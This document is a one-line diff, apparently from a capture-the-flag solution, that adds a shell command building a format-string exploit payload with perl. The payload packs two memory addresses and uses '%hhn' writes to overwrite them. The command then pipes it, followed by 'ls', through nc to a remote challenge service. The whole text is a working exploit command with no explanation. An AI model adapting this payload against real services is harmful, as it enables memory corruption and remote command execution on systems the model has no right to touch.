@@ -1,0 +1,1 @@
+cat <(perl -e 'print "prompt\n" . pack(l,0x08049c71) . pack(l,0x08049c70) . "%96x%5\$hhn%11x%6\$hhn\nls\n"') - | nc ctf.hackucf.org 7007
